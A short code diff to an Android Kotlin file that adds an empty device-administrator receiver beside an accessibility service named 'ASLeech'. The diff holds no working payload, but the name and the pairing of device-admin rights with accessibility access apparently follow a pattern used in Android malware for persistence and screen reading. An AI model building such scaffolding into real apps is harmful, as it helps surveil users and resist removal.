@@ -4,7 +4,16 @@ import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import android.util.Log
 import android.view.accessibility.AccessibilityNodeInfo
+import android.app.admin.DeviceAdminReceiver
+import android.content.Context
+import android.content.Intent
 
+
+class ASLeechDeviceAdminReceiver : DeviceAdminReceiver() {
+    override fun onEnabled(context: Context, intent: Intent) {
+        super.onEnabled(context, intent)
+    }
+}
 class ASLeech : AccessibilityService() {
     private val tag = "ASLeech"
 
